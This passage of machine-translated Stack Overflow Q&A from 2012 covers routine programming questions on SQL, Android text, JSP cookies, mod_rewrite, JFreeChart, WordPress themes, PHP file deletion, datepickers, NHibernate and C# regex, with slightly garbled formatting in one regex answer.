       ,(5,'Pepe')
       ,(6,'C.Ronaldo')
       ,(7,'Zidane')
       ,(8,'Raul')

INSERT INTO @TableTwo (ClassID,Students)
VALUES  (1,'1,3,5,6,8')
       ,(2,'2,4,7')

SELECT  ClassID
       ,(SELECT SUBSTRING((SELECT ',' + Name FROM @TableOne WHERE Students LIKE '%'+CAST(StudentID AS NVARCHAR(5))+'%' ORDER BY Name FOR XML PATH('')),2,200) AS CSV)
FROM @TableTwo 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:50:39.837

我强烈建议您更改将 StudentID 存储在第二个表中的方式

你可以这样做：

```
ClassID      StudentIDs
    --------    -----------
      1          1
      1          2
      2          3
      2          4 
```

然后我们可以使用查询来获取输出

```
SELECT ClassID , Names= 
    STUFF((SELECT ', ' + Names
           FROM Studentb 
           WHERE b.ClassID      = a.ClassID      
          FOR XML PATH('')), 1, 2, '')
FROM Studenta
GROUP BY ClassID 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T13:21:26.877

为此，您需要创建一个 SQL 函数。

```
Create Procedure GetStudent
as
  select ClassID , dbo.fnGetNamesById(StudentIDs) 
  from Table2
go

 create function fnGetNamesById (@psCSString as varchar(500))
  returns varchar(max)    
  as
Begin
    DECLARE @otTemp TABLE(sID VARCHAR(20))
    DECLARE @sTemp VARCHAR(100)

 WHILE LEN(@psCSString) > 0
    BEGIN
      SET @sTemp = LEFT(@psCSString, ISNULL(NULLIF(CHARINDEX(',', @psCSString) - 1, -1),
                        LEN(@psCSString)))
      SET @psCSString = SUBSTRING(@psCSString,ISNULL(NULLIF(CHARINDEX(',', @psCSString), 0),
                                   LEN(@psCSString)) + 1, LEN(@psCSString))
      INSERT INTO @otTemp VALUES (ltrim(@sTemp))
    End
    set @sTemp = ''
    select @sTemp = @sTemp + Name from table1 where StudentID    in (select sID from @otTemp)

    return @sTemp
End 
```

# crm - 按计划为每个客户生成 Microsoft CRM 4 报告

> ID：12318456
> 
> 赞同：0
> 
> 时间：2012-09-07T12:48:09.410
> 
> 标签：crm, dynamics-crm-4

我们有一个“客户”实体，每个客户实体包含多张发票，现在我们需要一个自动化流程，该流程每晚自动运行以生成属于该客户的所有发票的 PDF 报告并将其发送到客户电子邮件地址。该过程应该为所有客户运行，这意味着我们必须发送多封电子邮件。

我们需要一个建议，我们如何才能完成这项工作。

注意：我们使用的是 Microsoft CRM 4.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T18:07:00.487

所以这应该是相对简单的，虽然它有点涉及。

1.  创建一个 SSRS 报告，为给定的客户提供您需要的信息。
2.  编写一些代码来查找每个客户端并以编程方式生成 SSRS 报告，如下[所示](http://36chambers.wordpress.com/2011/06/03/reporting-services-2008-creating-reports-programmatically-without-using-a-reportviewer/)。
3.  以编程方式在 Crm 中创建电子邮件记录并附加生成的报告。
4.  在某些计划的进程中运行此代码，例如 Windows 服务或工作流。

# android - 字符串字母消失

> ID：12318457
> 
> 赞同：0
> 
> 时间：2012-09-07T12:48:12.667
> 
> 标签：android

我正在尝试在 TextView 中编写信德语言字符串，但有些字母消失了。例如：当我写“ٿ”时，这很好，但是当我将另一个字母组合起来时，如 text.getText().toString()+“ي”，所以“ٿ”消失了，android 无法组合这些信..谢谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:58:06.077

这可能会帮助你

```
TextView text = (TextView) findViewById(R.id.text);
        text.setText("ٿ");      
        String s1 = text.getText().toString();      
        String s2 =  s1 +" "+ "ي";      
        text.setText(s2.toString()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:29:36.000

您是否使用任何库来显示信德文本。如果没有，请使用它，否则将其正确放入 assest 文件夹中。

# java - 不使用 doGet/doPost 获取 cookie

> ID：12318466
> 
> 赞同：3
> 
> 时间：2012-09-07T12:48:38.320
> 
> 标签：java, jsp, jakarta-ee, servlets

我正在使用 Java EE 制作一个动态 Web 项目。如果我理解正确的话，JSP 页面是在服务器中准备好的。所以，如果我想读取一个 cookie，我想我不需要向服务器发出 get/post 请求来读取它。

这就是我的问题；如果没有正式的 doGet/doPost，我如何检索该用户拥有的所有 cookie？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:56:46.553

如果你使用 JSTL，你可以做类似的事情：

```
 <c:forEach items="${cookie}" var="currentCookie">
     ${currentCookie.name} - ${currentCookie.value}<br/>
  </c:forEach> 
```

和`forEach`使用之外`${cookie.cookieName.value}`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T14:08:48.493

为了完整起见，展示如何使用 request.getCookie() 获取 servlet 中的 cookie 列表：

```
public class TestServlet extends HttpServlet {

  @Override
  protected void doGet(HttpServletRequest req, HttpServletResponse resp)
      throws ServletException, IOException {
    req.getCookies();
    for (Cookie c : req.getCookies())
    {
      System.err.println(c.getName() + ":" + c.getValue());
    }
  }
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-07T12:50:52.383

在 JSP 中使用以下内容：

```
<%

Cookies[] coockies = request.getCookies(); 

%> 
```

这将返回请求中收到的 cookie 数组。

# javascript - 需要使用 JavaScript 上传文件

> ID：12318470
> 
> 赞同：0
> 
> 时间：2012-09-07T12:48:52.457
> 
> 标签：javascript, jquery, html, file-upload, client-side

```
<input type="file" id="fileToUpload" />
<input type="button" id="btnFup" value="Upload" onclick="fileUpload();" /> 
```

我想仅使用 JavaScript 或 jQuery 将图像上传到服务器端文件夹。我不想使用后面的代码。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:50:33.130

是的，你需要在服务器端使用一些东西。这是用于文件上传的最佳方法之一[http://www.uploadify.com/](http://www.uploadify.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:51:35.647

*   [JavaScript：上传文件](https://stackoverflow.com/questions/5587973/javascript-upload-file)
*   [http://www.google.pl/search?q=javascript+file+upload&sugexp=chrome,mod=16&sourceid=chrome&ie=UTF-8](http://www.google.pl/search?q=javascript+file+upload&sugexp=chrome,mod=16&sourceid=chrome&ie=UTF-8)
*   [http://www.queness.com/post/11434/7-javascript-ajax-file-upload-plugins](http://www.queness.com/post/11434/7-javascript-ajax-file-upload-plugins)
*   [http://igstan.ro/posts/2009-01-11-ajax-file-upload-with-pure-javascript.html](http://igstan.ro/posts/2009-01-11-ajax-file-upload-with-pure-javascript.html)

?

# mod-rewrite - 对文件的 mod_rewrite 请求到域根并附加查询参数

> ID：12318474
> 
> 赞同：1
> 
> 时间：2012-09-07T12:49:04.533
> 
> 标签：mod-rewrite, url-rewriting

好的，这适用于我的域 (http://staging.whiterabbitexpress.com)

```
RewriteRule ^send-your-request/?$ http://staging.whiterabbitexpress.com [NC,QSA,L] 
```

但是有没有办法在不输入整个域名的情况下重定向到根目录？

我试过

```
RewriteRule ^send-your-request/?$ / [NC,QSA,L]
RewriteRule ^send-your-request/?$ index.php [NC,QSA,L]
RewriteRule ^send-your-request/?$ /index.php [NC,QSA,L] 
```

纳达，纳达，纳达

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T14:27:46.163

您缺少`R`方括号中的标志，它告诉重写引擎重定向而不是内部重写：

```
RewriteRule ^send-your-request/?$ / [NC,QSA,L,R] 
```

您也可以说`R=301`是否要永久重定向。您之前不需要它的原因是，当您`http://domain.name`在重写目标中包含 时，它会使用 302 隐式重定向。

# java - 将 ChartPanel 添加到 JPanel

> ID：12318488
> 
> 赞同：2
> 
> 时间：2012-09-07T12:49:52.173
> 
> 标签：java, netbeans, jpanel, jfreechart

我这里有一些不起作用的代码：

```
 XYSeriesCollection dataset = new XYSeriesCollection();
    dataset.addSeries(series);
    JFreeChart chart = ChartFactory.createXYLineChart(null, null, null, dataset, PlotOrientation.HORIZONTAL, true, true, true);
    ChartPanel chartpanel = new ChartPanel(chart);

    chartpanel.setDomainZoomable(true);
    jPanel4.setLayout(new BorderLayout());
    jPanel4.add(chartpanel, BorderLayout.NORTH); 
```

所以问题是带有图表的jPanel4是不可见的。当我将我的图表面板添加到框架并使其可见时，它就可以工作了。

任何人都知道我的错误是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-07T13:12:43.277

这对我来说非常好：

```
import java.awt.BorderLayout;

import javax.swing.JFrame;
import javax.swing.JPanel;

import org.jfree.chart.ChartFactory;
import org.jfree.chart.ChartPanel;
import org.jfree.chart.JFreeChart;
import org.jfree.chart.plot.PlotOrientation;
import org.jfree.data.xy.XYSeries;
import org.jfree.data.xy.XYSeriesCollection;

public class Main {
    public static void main(String[] args) {
        XYSeries series = new XYSeries("asdf");
        for (int i = 0; i < 100; i++)
            series.add(i, Math.random());
        XYSeriesCollection dataset = new XYSeriesCollection(series);
        JFreeChart chart = ChartFactory.createXYLineChart(null, null, null, dataset, PlotOrientation.HORIZONTAL, true, true, true);
        ChartPanel chartpanel = new ChartPanel(chart);
        chartpanel.setDomainZoomable(true);

        JPanel jPanel4 = new JPanel();
        jPanel4.setLayout(new BorderLayout());
        jPanel4.add(chartpanel, BorderLayout.NORTH);

        JFrame frame = new JFrame();
        frame.add(jPanel4);
        frame.pack();
        frame.setVisible(true);
    }
} 
```

你能给我们提供更多的代码吗？你把别的东西放进去`jPanel4`吗？`NORTH, SOUTH, WEST, EAST, CENTER`每个点 ( )中不能有多个组件。您是否将面板放入框架中？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:03:05.793

你`CENTER`在 jpanel 的布局中有什么其他尝试在中心添加图表吗

```
ChartPanel chartpanel = new ChartPanel(chart);
chartpanel.setDomainZoomable(true);
jPanel4.add(chartpanel, BorderLayout.CENTER); 
```

`NORTH`实际上是容器的顶部。

# operating-system - 轻量级流程如何运作？

> ID：12318490
> 
> 赞同：1
> 
> 时间：2012-09-07T12:50:01.747
> 
> 标签：operating-system

*轻量级进程*究竟是如何工作的，为什么我们需要将用户线程与内核线程进行映射？

此外，轻量级进程是否仅在支持内核线程的操作系统中出现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T02:37:22.410

实际上`Light Weight Processes`（lwp）在单个内核线程之上的用户空间中运行，并与同一进程中的其他 LWP 共享其地址空间和系统资源。由线程库管理的多个用户级线程可以放置在一个或多个 LWP 之上 - 允许在用户级完成多任务。
现在背后的原因是`LWPs are slower and more expensive`创建比用户线程。每当创建 LWP 时，必须首先进行系统调用以创建相应的内核线程，从而切换到内核模式。因此，在同一空间中创建多个用户级线程可以更快地工作，无需系统调用和抢占并提供多任务处理。

# c - 编译时的 RAM 内存优化

> ID：12318497
> 
> 赞同：3
> 
> 时间：2012-09-07T12:50:35.070
> 
> 标签：c, ram

我正在开发一个使用 C 编程语言的项目，我试图在编译时分析 RAM 内存（段分配）以获取特定功能的库文件。这将帮助我在编译级别本身静态优化我的数据大小。

我正在使用 Wind River(Diab 5.8) 编译器。这可以在飞思卡尔微控制器平台上运行。我正在 Windows 环境中开发此应用程序。请帮我找到这个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:08:24.610

如果您传递`-m`给链接器，则足以让它打印出段分配列表。这样，您将能够查看特定（静态链接）库占用了多少代码段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:58:38.237

好的，了解架构的区别：您尝试过[吗？](http://cache.freescale.com/files/soft_dev_tools/doc/app_note/AN4329.pdf)

# wordpress - WordPress - 新手困惑警报

> ID：12318498
> 
> 赞同：0
> 
> 时间：2012-09-07T12:50:38.190
> 
> 标签：wordpress

我以前没有真正使用过 WP，但现在我必须快速学习它：（我一直在使用 PHP 编码并构建自己的 CMS - 但我发现 WP 有点/非常混乱。（部分是术语“博客”）发布'等-我不想写博客..只是建立一个网站！）

小故事：我的客户设计了一个主页和内容页面，并希望在 WP 中生成它。我告诉她这个设计不会完全像她设计的那样，因为它需要适合 WP 模板。（我发现一个距离不远的地方）。但是 - 我开始怀疑我是否给了她不好的信息 - 实际上你可以构建任何页面并将其作为 WP 主题/安装/其他的一部分？是这样吗？如果是这样，您如何通过 CMS 编辑页面？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:59:11.210

我会试着让你开始。您可以使 WordPress 网站看起来像您想要的任何东西。是的，你必须从某种主题开始。这可以是现有的已完成主题、空白的启动主题，或者您可以自己创建主题文件并从头开始。您要做的第一件事是熟悉主题文件结构和每个文件的用途。这会让你走得很远。

一旦您选择了一个主题作为开始，并对网站的总体外观和结构进行了编码，您就可以开始为可能看起来与总体结构有些不同的单个页面设置主题。这样做的方法是创建一个文件（我通常复制并重命名 page.php 文件）并将其重命名为 page-templatename.php - 'templatename' 被替换为您想要调用页面的任何内容。然后在页面顶部添加一个 php 注释，上面写着 Template Name: You Template Name Here。然后从 WP 后端页面编辑器中，您可以从右侧的页面模板选择中选择此模板。

花点时间尽职尽责地学习文件结构，你将在你所拥有的其他经验中顺利进行。依靠 wordpress codex：codex.wordpress.org

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:52:52.053

您需要在 wp-content/theme 下创建一个带有`index.php`and `CSS`(style.css) 的模板，并从后端激活它。如果您不想拥有任何 wordpress 功能并拥有基本布局，即使您也可以创建。

例如 -

在`\htdocs\wordpress\wp-content\themes\yourthemename`创建 index.php 并发布类似的代码 -

```
<?php
/**
 * The main template file.
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage yourthemename
 */ 
```

在 style.css 中使用这个**CSS**

```
/*
Theme Name: yourthemename
Theme URI: http://wordpress.org/extend/themes/troop
Author: Swapnesh Sinha
Author URI: http://swapneshsinha.wordpress.com/
Description: nice theme from wordpress labs.
Version: 1.0
License: GNU General Public License v2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html
*/ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:53:43.000

请参阅本文的第 2 部分：[WP 主题指南](http://webdesignerwall.com/tutorials/complete-wordpress-theme-guide)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T12:57:34.613

你可以让 WordPress 做你喜欢的样子。

从阅读[主题发展](http://codex.wordpress.org/Theme_Development)法典开始。我还发现[模板层次结构](http://codex.wordpress.org/Template_Hierarchy)是一种有用的资源。

如果站点很简单，那么您在主题中只需要一个样式表和 index.php 文件即可。

# java - .ftl 文件中 dbsight 中的 URLDecode

> ID：12318501
> 
> 赞同：1
> 
> 时间：2012-09-07T12:50:49.403
> 
> 标签：java, applet, freemarker, urldecode

任何人都可以知道如何解码

> %E3%82%A2%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%A2%E3%83%B3%E3%82%A8%E3%82%A4%E3 %82%B8

`dbsight`文件中的值`.ftl`。它在java中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:04:37.033

用这个

```
System.out.println(URLDecoder.decode(s, "UTF-8")); 
```

# arrays - 使用 Corona sdk 的 Sprite 网格（2D 数组）的 touchEvent

> ID：12318503
> 
> 赞同：0
> 
> 时间：2012-09-07T12:50:52.470
> 
> 标签：arrays, events, touch, coronasdk, sprite

我在二维数组中有一个动画精灵网格，但是当为精灵对象放置 eventListener 时，它显示以下错误“导演错误：无法加载模块'游戏'-请检查文件是否存在并且它是正确的."，当我删除触摸代码时，下一个场景会在网格中弹出动画火球（这很好），但我想为网格中的各个精灵实现触摸事件。请帮我。谢谢

这是代码：

模块（...，package.seeall）函数新（）

```
local localGroup = display.newGroup()

local gamebg=display.newImageRect("gameBG.png",_W,_H)
gamebg:setReferencePoint(display.centerReferencePoint)
gamebg.x=_W/2
gamebg.y=_H/2
swapButton = {} --A 2D Array
local instance = {}

require "sprite"

local tempX=130
local tempY=60

for i = 0, 6, 1 do
    swapButton[i]={}
    instance[i]={}

    for j=0,6,1 do      
        instance[i][j]=sprite.newSprite(sprite.newSpriteSet(sprite.newSpriteSheet("fireBall.png",36,36),1,40))
        instance[i][j].x=tempX
        instance[i][j].y=tempY
        instance[i][j]:prepare()
        instance[i][j]:play()

        instance[i][j]:addEventListener("touch",myTouchListener)
        swapButton[i][j]= display.newImage("circle.png",40,40)
        swapButton[i][j].x=tempX
        swapButton[i][j].y=tempY
        tempX=tempX+40

    end
    tempX=130
    tempY=tempY+40
end

function myTouchListener:touch(event)
if event.phase == "began" then
    display.getCurrentStage( ):setFocus( event.target );
    print(display.getCurrentStage( ))
 elseif event.phase=="moved" then
 print("moved")   
elseif event.phase == "ended" then
    display.getCurrentStage( ):setFocus( nil );
end

localGroup:insert(gamebg)

return localGroup 
```

结尾

谢谢

-赫曼思

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T14:00:10.790

您缺少侦听器的结束语句，并且它的实现本身是不确定的，因为您没有声明 myTouchListener。尝试以下操作：

```
module(..., package.seeall)
function new()

    local localGroup = display.newGroup()

    local gamebg=display.newImageRect("gameBG.png",_W,_H)
    gamebg:setReferencePoint(display.centerReferencePoint)
    gamebg.x=_W/2
    gamebg.y=_H/2
    swapButton = {} --A 2D Array
    local instance = {}

    require "sprite"

    local tempX=130
    local tempY=60

    for i = 0, 6, 1 do
        swapButton[i]={}
        instance[i]={}

        for j=0,6,1 do
            instance[i][j]=sprite.newSprite(sprite.newSpriteSet(sprite.newSpriteSheet("fireBall.png",36,36),1,40))
            instance[i][j].x=tempX
            instance[i][j].y=tempY
            instance[i][j]:prepare()
            instance[i][j]:play()

            function myTouchListener(event)
                if event.phase == "began" then
                    display.getCurrentStage( ):setFocus( event.target );
                    print(display.getCurrentStage( ))
                elseif event.phase=="moved" then
                    print("moved")
                elseif event.phase == "ended" then
                    display.getCurrentStage( ):setFocus( nil );
                end
            end

            instance[i][j]:addEventListener("touch",myTouchListener)
            swapButton[i][j]= display.newImage("circle.png",40,40)
            swapButton[i][j].x=tempX
            swapButton[i][j].y=tempY
            tempX=tempX+40
        end
        tempX=130
        tempY=tempY+40
    end

    localGroup:insert(gamebg)

    return localGroup
end 
```

# php - 删除包含图像的相册文件夹

> ID：12318504
> 
> 赞同：2
> 
> 时间：2012-09-07T12:51:03.993
> 
> 标签：php, image, directory, sql-delete

我正在尝试删除包含所有图像的相册。存储的相册和图像的路径是*../_uploads/< album_name >/< image_file >*。这是我的 delete_album.php 中的代码：

```
 if(isset($_GET['album_id']) === true){
    $album_id = (int)$_GET['album_id'];
    $query_album_info = "SELECT `albums`.`album_id`, `albums`.`album_name`, `images`.`image_name`, `images`.`image_ext`
                        FROM `albums`
                        LEFT JOIN `images` ON `albums`.`album_id` = `images`.`album_id`
                        WHERE `albums`.`album_id` = {$album_id}
                        LIMIT 1 ";
    $album_info = mysql_query($query_album_info, $connection) or die(mysql_error());
    $row_album = mysql_fetch_assoc($album_info);

    $album = $row_album['album_name'];
    $img_file = $row_album['image_name'] . '.' . $row_album['image_ext'];

    $images = scandir("../_uploads/{$album}/");
    unset($images[0]);
    unset($images[1]);
    //echo "<pre>",print_r($images,true),"</pre>";

    foreach($images as $image){
        unlink("../_uploads/{$album}/{$image_file}");
    }
    if(rmdir("../_uploads/{$album}") === true){
        //delete all images of album from database
        $query_delete_images = "DELETE FROM `images` WHERE `album_id` = {$album_id}";
        $delete_images = mysql_query($query_delete_images) or die(mysql_error());
        if(mysql_affected_rows() == 1){         
        }else{
            redirect_to("albums.php?del_imgs=1");
        }
        //delete album from database
        $query_delete_album= "DELETE FROM `albums` WHERE `album_id` = {$album_id}";
        $delete_album= mysql_query($query_delete_album) or die(mysql_error());
        if(mysql_affected_rows() == 1){ 
            redirect_to("albums.php?delete_album=1");
        }else{
            redirect_to("albums.php?delete_error_album=1");
        }
    }else{
        redirect_to("albums.php?rmdir_error=1");
    }

}else{
    redirect_to("albums.php");
} 
```

我从重定向到 albums.php 得到的错误消息是 [i]rmdir_error=1[/i]，所以没有图像从数据库、文件夹和相册中删除，所以 rmdir 函数不起作用因为图像仍然存在。有什么想法可能是错的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:52:32.687

您在循环中使用了错误的变量（`$image_file`而不是`$image`）。所以什么都没有被删除，当你尝试调用`rmdir()`时，目录不为空。

```
// Use the correct variable in the loop statement: changed $image to $image_file
foreach($images as $image_file) {
    // Don't attempt to remove the current directory or parent
    // Since scandir() will return those too...
    if ($image_file !== "." && $image_file !== "..") {
      unlink("../_uploads/{$album}/{$image_file}");
    }
} 
```

# datepicker - multiDatesPicker：如何在不更改日期按钮颜色的情况下禁用单击？

> ID：12318505
> 
> 赞同：0
> 
> 时间：2012-09-07T12:51:14.350
> 
> 标签：datepicker, jquery-ui-datepicker

我在这里下载了 multiDatesPicker：http: [//multidatespickr.sourceforge.net](http://multidatespickr.sourceforge.net)

我的问题是..

我使用 multiDatesPicker 仅用于通过代码表示添加的日期。

而且我不想接收任何用户交互。

我知道如何禁用 multiDatesPicker 的唯一方法是“禁用：true”选项。但这会使日历的添加日期按钮颜色发生变化。

我已经尝试使用 css(.ui-state-disabled) 更改不透明度，但这只是不透明度。

有没有人知道如何在不更改我们可以看到的任何内容的情况下禁用日历？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-10T05:30:18.923

自我回答

此解决方案适用于 datepicker 和 multidatepicker。只需执行 2 个步骤

**一、改javascript**

在您的“jquery.ui.datepicker.js”源代码中，在下面找到

```
(unselectable ? '<span class="ui-state-default">' + printDate.getDate() + '</span>' : 
                         '<a class="ui-state-default' + .. 
```

并将其更改为：

```
(/*(unselectable ? '<span class="ui-state-default">' + printDate.getDate() + '</span>' : 
                         */'<a class="ui-state-default' + 
```

**二、添加css样式**

```
#yourCal .ui-state-disabled {
    BACKGROUND-IMAGE: none; FILTER: none; opacity: .99;
}
.ui-datepicker .ui-datepicker-calendar .ui-state-highlight a {
    background: #743620 none;
    color: white;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-05T18:34:35.587

只需在您的日期选择器初始化代码中再添加一个选项，它就可以工作

```
 onSelect:function (dateText, inst) {
    var newDate = new Date();
    inst.drawMonth = newDate.getMonth();
    inst.drawYear = newDate.getFullYear();
    inst.currentMonth = newDate.getMonth();
    inst.currentYear = newDate.getFullYear();
} 
```

# iphone - iphone开发：背景较暗

> ID：12318507
> 
> 赞同：0
> 
> 时间：2012-09-07T12:51:21.420
> 
> 标签：iphone, objective-c, ios, opacity, uicolor

在我的应用程序中，我想让我的背景更暗。我不能使用`background.alpha = (float between 0-1)`，因为它只会让它更轻。我需要的是有一个背景，就像所有颜色都像过滤器一样暗。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:00:26.033

你可以在你的背景视图上添加一个覆盖视图，它是黑色的，并使用 alpha 通道来决定你希望你的背景有多暗。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:01:18.690

将背景设置为黑色，在其上添加一个带有白色背景的 UIImageView，然后对 UIImage 的 alpha 进行操作。在 1 时，您将有一个白色背景，在 0 时，它将是黑色的。也适用于其他颜色！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T18:27:05.853

我首选的策略是获取背景的[Hue:saturation:brightness:alpha:，](http://developer.apple.com/library/ios/documentation/uikit/reference/UIColor_Class/Reference/Reference.html#//apple_ref/occ/instm/UIColor/getHue%3asaturation%3abrightness%3aalpha%3a)然后通过降低亮度来获得新的背景颜色。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T13:01:24.393

这是一个有用的宏，用于设置颜色，比`UIColor`：

```
#define UIColorFromRGB(rgbValue) [UIColor \
colorWithRed:((float)((rgbValue & 0xFF0000) >> 16))/255.0 \
green:((float)((rgbValue & 0xFF00) >> 8))/255.0 \
blue:((float)(rgbValue & 0xFF))/255.0 alpha:1.0] 
```

然后，您可以使用正常的十六进制值（即来自 Photoshop 或大多数颜色选择器类型控件）来设置背景颜色或任何其他颜色，即

```
self.view.backgroundColor = UIColorFromRGB(0x6f99d5); 
```

# c# - NHibernate：使用 byte[] 属性验证模式

> ID：12318509
> 
> 赞同：0
> 
> 时间：2012-09-07T12:51:27.107
> 
> 标签：c#, mysql, nhibernate, fluent-nhibernate

我需要验证架构，其中我有一个具有 byte[] 属性 (BLOB) 的对象。当我运行验证时，我收到 OverflowException：“对于 Int32，值太大或太小。”

我正在使用 NHibernate 3.1.0.400 和 FluentNHibernate 1.2.0.712 我已经创建了测试项目来检查它。这是代码（它在验证时掉落）：

```
static void Main(string[] args)
    {
        var configuration = new NHibernate.Cfg.Configuration();

        string connectionString = "some connection string";
        Console.WriteLine("Running test with connection string: {0}", connectionString);
        Dictionary<string, string> props = new Dictionary<string, string>()
                                               {
                                                   {"connection.provider", "NHibernate.Connection.DriverConnectionProvider"},
                                                   {"connection.driver_class", "NHibernate.Driver.MySqlDataDriver"},
                                                   {"connection.connection_string", connectionString},
                                                   {"dialect", "NHibernate.Dialect.MySQL5Dialect"},
                                               };
        configuration.AddProperties(props);
        var mappings = Fluently.Configure(configuration)
            .Mappings(m => m
                               .FluentMappings.AddFromAssemblyOf<DataResource>()
                               .Conventions.AddFromAssemblyOf<DataResource>());

        var sessionFactory = mappings
               .ExposeConfiguration(DoExtendedConfiguration)
               .BuildSessionFactory();
    }

    private static void DoExtendedConfiguration(Configuration configuration)
    {
        SchemaExport schemaExport = new SchemaExport(configuration).SetDelimiter(";").SetOutputFile("schema.sql");
        schemaExport.Create(false, true);

        SchemaValidator schemaValidator = new SchemaValidator(configuration);
        schemaValidator.Validate();
    }

 public class DataResource
{
    public int Id { get; set; }
    public byte[] Value { get; set; }
}
public class DataResourceMap : ClassMap<DataResource>
{
    public DataResourceMap()
    {
        Id(x => x.Id);
        Map(x => x.Value);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:52:42.163

我没有在官方上找到任何关于此类错误的提及，但在我将 FluentNhibernate 和 Nhibernate 更新到最后一个可用版本（通过 Nuget）后，问题解决了。这适合我，所以我将结束这个问题，就好像没有人找到任何其他解决方案并且堆栈允许我这样做。

# c# - 3 个或更少字符的正则表达式选项

> ID：12318517
> 
> 赞同：0
> 
> 时间：2012-09-07T12:51:48.507
> 
> 标签：c#, regex

我在下面有一个正则表达式，适用于以下字符串示例：

*   `MCCOY 3H L24 FINAL 02-28-2012.dwg`或者
*   `SMITH-JOHNSON 5H R32 FINAL 05-26-2012.dwg`

但是现在我试图弄清楚如何更改正则表达式以适用于上面的示例，如果它们是这样的：

*   `MCCOY 3H L-ABC FINAL 02-28-2012.dwg`或者
*   `SMITH-JOHNSON 5H R-123 FINAL 05-26-2012.dwg`

他们也可以像

*   `MCCOY 3H L-C2 FINAL 02-28-2012.dwg`或者
*   `SMITH-JOHNSON 5H R-2 FINAL 05-26-2012.dwg`

总而言之，中间部分总是有一个**Alphabetic 字符后跟一个 Dash**，然后它可能有**多达 3 个数字或字母字符**或少**至 1 个数字或字母字符**。

```
"^[a-z]+(?:[ -][a-z]+)*\s+\d+[a-z]\s+[a-z]\d+\s+[a-z]+\s+\d{2}-\d{2}-\d{4}\.dwg$" 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:02:12.060

```
\w{1,3} 
```

匹配 1 到 3 个字母数字字符。

[http://msdn.microsoft.com/en-us/library/az24scfc.aspx#quantifiers](http://msdn.microsoft.com/en-us/library/az24scfc.aspx#quantifiers)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:07:36.360

我需要添加一个`(?i)`来让它工作，因为`[a-z]`不匹配大写字符 - 至少在我通常使用的正则表达式引擎中:) 所以我得到了这个：

```
(?i)^[a-z]+(?:[ -][a-z]+)*\s+\d+[a-z]\s+[a-z]-\w{1,3}\s+[a-z]+\s+\d{2}-\d{2}-\d{4}\.dwg 
```

[在 Regexr 上自己尝试一下](http://regexr.com?322v7)。

**编辑：**正如@Oded 让我注意到的那样，问题中的星星不是输入字符串的一部分 - 删除并更新了 Regexr 链接。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:19:44.473

这是将分别返回所有字段的正则表达式：

```
^(?<Customer>.*?)\s+?(?<Id1>[\-a-z0-9]*?)\s+?(?<Id2>[\-a-z0-9]*?)\s+?FINAL\s+?(?<Date>[\-0-9]{10})\.dwg$ 
```

字段说明：

*   **客户**: `MCCOY`, `SMITH-JOHNSON`,`JAKE MCCOY`
*   **`5H`身份证1 **：，**`3H`**
***   **Id2** : `L24`, `R32`, `L-ABC`, `R-123`,`L-C2`*   **日期**: `02-28-2012`,`05-26-2012`**

 **测试：

```
MCCOY         3H L24   FINAL 02-28-2012.dwg
SMITH-JOHNSON 5H R32   FINAL 05-26-2012.dwg
JAKE MCCOY    3H L-ABC FINAL 02-28-2012.dwg
SMITH-JOHNSON 5H R-123 FINAL 05-26-2012.dwg
MCCOY         3H L-C2  FINAL 02-28-2012.dwg
SMITH-JOHNSON 5H R-2   FINAL 05-26-2012.dwg 
```**

# android - InputConnectionWrapper 警告

> ID：12318521
> 
> 赞同：12
> 
> 时间：2012-09-07T12:52:19.093
> 
> 标签：android, warnings

每当我的应用可见时关闭屏幕时，我都会收到 InputConnectionWrapper 警告。我不知道为什么，因为我不使用`InputConnection`.

这是 LogCat 输出。

```
09-07 14:21:31.716: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:31.724: W/IInputConnectionWrapper(24197): getExtractedText on inactive InputConnection
09-07 14:21:31.724: W/IInputConnectionWrapper(24197): getTextBeforeCursor on inactive InputConnection
